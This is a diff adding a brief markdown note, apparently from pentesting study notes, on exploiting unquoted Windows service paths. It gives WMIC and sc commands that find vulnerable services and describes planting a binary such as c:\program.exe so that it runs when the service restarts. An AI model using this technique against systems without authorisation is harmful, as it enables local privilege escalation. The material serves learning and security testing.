@@ -1,0 +1,36 @@
+## Unquoted Service Paths
+
+### Basic steps to take
+
+#### Exploition
+
+Find Services With Unquoted Paths
+
+**Using WMIC**
+```
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """`
+```
+
+**Using sc**
+```
+sc query
+sc qc service name
+```
+
+**Look for Binary_path_name and see if it is unquoted.**
+If the path contains a space and is not quoted, the service is vulnerable.
+
+Exploit It
+
+If the path to the binary is:
+
+```
+c:\Program Files\something\winamp.exe
+```
+
+We can place a binary like this
+```
+c:\program.exe
+```
+
+When the program is restarted it will execute the binary program.exe, which we of course control. We can do this in any directory that has a space in its name. Not only program files.
